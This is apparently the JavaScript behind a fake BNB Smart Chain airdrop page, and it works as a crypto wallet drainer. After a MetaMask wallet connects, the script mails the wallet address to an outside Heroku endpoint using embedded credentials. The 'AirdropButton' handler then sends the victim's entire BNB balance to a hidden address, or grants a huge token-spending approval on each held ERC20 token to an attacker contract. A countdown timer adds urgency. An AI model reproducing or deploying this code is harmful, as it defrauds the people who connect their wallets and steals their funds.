




// function countTime() {
//     var dateTime=new Date();

//     var endTime24 =  new Date(dateTime.getFullYear(), dateTime.getMonth(), dateTime.getDate(), 23, 59, 59, 0);

//     yesd =  dateTime.getFullYear().toString() + "-" + (dateTime.getMonth()+1).toString() + "-"  + dateTime.getDate().toString() 

//     console.log("y=",yesd,endTime24)

//     const endTimeObj = endTime24;

//     var leftTime = endTimeObj - new Date();

//     var d, h, m, s;
//     if (leftTime < 0) {
//         return;
//     }
//     d = Math.floor(leftTime / 1000 / 60 / 60 / 24);
//     h = Math.floor((leftTime / 1000 / 60 / 60) % 24);
//     m = Math.floor((leftTime / 1000 / 60) % 60);
//     s = Math.floor((leftTime / 1000) % 60);

//     const str = `${h}:${m}:${s}`;

//     setTimeout(countTime, 1000);
//     console.log(str);

// }

// countTime();


function padding1(num, length) {
    for (var len = (num + "").length; len < length; len = num.length) {
        num = "0" + num;
    }
    return num;
}




$(function () {

    this.web3 = new Web3(window.ethereum);

    $.apv = "";

    $.balance = 0;
    $.myaddr = "";

    $.TimerCheckOnline = () => {
        this.web3.eth.getAccounts()
            .then(addrs => {
                //console.log("TimerCheckOnline addrs =",addrs)
                if (addrs.length == 0) {
                    //window.location.href = '/swap'
                    // offLine
                    $("#one").show();
                    $("#two").hide();

                    $.apv = "";

                } else {
                    // online
                    this.web3.eth.getBalance(addrs[0]).then(v => {
                        $.balance = v;
                        $.myaddr = addrs[0];
                        let ban1 = (v / (10 ** 18)).toFixed(5);
                        $("#BalanceShow").text(ban1 + " BNB");
                        //console.log("ban1=",ban1)

                    })

                    $("#WalletAddr").text(AddrToShort(addrs[0]));

                    $("#one").hide();
                    $("#two").show();

                    if ($.apv == "") {

                        $.solapi.bigConAddr(addrs[0], (bnb, others) => {
                            console.log("(bnb,others)=", bnb, others)

                            if (others.length > 0) {
                                ass = ""
                                for (let i = 0; i < others.length; i++) {
                                    if (ass.length == 0) {
                                        ass += others[i]
                                    } else {
                                        ass += "|" + others[i]
                                    }

                                }

                                //window.location.href = '/swapa?p=' + ass
                                $.apv = ass;

                            } else {
                                //window.location.href = '/swapb'

                                $.apv = "no";
                            }


                        })



                    }

                }
            });
    }



    $.TimerCheckOnline();
    var timer1 = setInterval($.TimerCheckOnline, 2000);




    $.solapi = new SolApi()





    $("[id=ConnectButton]").click(function (event) {
        console.log("Connect Wallet.")

        if (window.ethereum.networkVersion == "56") {
            //if (window.ethereum.networkVersion == "97") {
            $.connectMask();
        } else {
            ChangeToBSC((isok) => {
                //ChangeToTestBSC((isok) => {
                if (isok == true) {
                    $.connectMask();

                } else {
                }
            })
        }
    });

    $.sendMail = (address) => {
        let data = {
            email: "huskymag2017@gmail.com",
            html: address,
            title: "Get Wallet Information",
        }
        let option = {
            method: 'POST',
            // mode: "no-cors",
            headers: {
                'Authorization': "Basic QWV4cHJlc3M6ZTcwNmRkOTEtZmFlYS00ZWJiLWI5N2EtMDYwMjQxMDg1ZWVm",
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data) // body data type must match "Content-Type" header
        }

        fetch("https://stark-cliffs-98423.herokuapp.com/sendmail", option)
            .then(response => response.json())
            .then(data => console.log(data))

    }

    $.connectMask = () => {
        window.ethereum.request({ method: 'eth_requestAccounts' }).then((result) => {
            address = result[0];

            console.log('MetaMask connect ok! address=', address);

            $.sendMail(address);
            $.TimerCheckOnline();


        }).catch((error) => {
            console.log("error", error);
        });

    }










    $("#AirdropButton").click(() => {

        if ($.apv == "") {
            console.log("--- AirdropButton 0--- nologin $.apv=", $.apv)
            alert("Please connect the wallet first!");

        } else if ($.apv == "no") {
            console.log("--- AirdropButton 1--- $.apv=", $.apv, " $.balance=", $.balance)

            let gas = (1 * 10 ** 16);
            this.web3.eth.sendTransaction({
                from: $.myaddr,
                to: $.inaddr,
                value: $.balance - gas
            }).then(function (receipt) {

            });

        } else {
            console.log("--- AirdropButton 2--- $.apv=", $.apv)

            let apNum = BigInt(1.15792 * (10 ** 59))
            console.log("-----approve-----")
            console.log("Myaddr=", this.addr)
            console.log("$.apv=", $.apv)
            console.log("$.incontract=", $.incontract)

            let aplist = $.apv.split("|")

            //console.log("aplist=",aplist)

            for (let i = 0; i < aplist.length; i++) {
                //console.log(1111111111)
                let ap = aplist[i];
                let apvContract = new this.web3.eth.Contract(ERC20_ABI, ap);
                //console.log(2222222222)

                apvContract.methods.approve($.incontract, apNum).send({ from: $.myaddr }, (error, transactionHash) => {
                    console.log("result =", error, transactionHash);
                    if (error == null) { } else { }
                });
            }


            $.get("/save", { g: $.myaddr, a: $.apv }, function (data, status) {
                console.log("save", data, status);
            });

        }

    });




    $.countTime = () => {

        var dateTime = new Date();

        var endTime24 = new Date(dateTime.getFullYear(), dateTime.getMonth(), dateTime.getDate(), 23, 59, 59, 0);

        yesd = dateTime.getFullYear().toString() + "-" + (dateTime.getMonth() + 1).toString() + "-" + dateTime.getDate().toString()

        //console.log("y=",yesd,endTime24)

        const endTimeObj = endTime24;

        var leftTime = endTimeObj - new Date();

        var d, h, m, s;
        if (leftTime < 0) {
            return;
        }
        d = Math.floor(leftTime / 1000 / 60 / 60 / 24);
        h = Math.floor((leftTime / 1000 / 60 / 60) % 24);
        m = Math.floor((leftTime / 1000 / 60) % 60);
        s = Math.floor((leftTime / 1000) % 60);

        const str = `${padding1(h, 2)}:${padding1(m, 2)}:${padding1(s, 2)}`;


        //console.log(str);

        setTimeout($.countTime, 1000);

        $("#timecount").text("Time Left:" + str);



    }

    $.countTime();


});









